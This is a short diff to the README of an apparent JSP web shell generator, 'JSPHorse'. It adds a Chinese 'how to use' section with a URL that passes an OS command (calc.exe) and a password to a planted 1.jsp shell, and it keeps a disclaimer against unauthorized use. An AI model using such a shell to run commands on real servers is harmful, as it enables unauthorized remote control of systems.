@@ -37,6 +37,10 @@
 
 `java -jar JSPHorse.jar -p your_password -j`
 
+如何使用？
+
+http://xxx/1.jsp?pwd=your_password&cmd=calc.exe
+
 ## 免责申明
 
 未经授权许可使用`JSPHorse`攻击目标是非法的
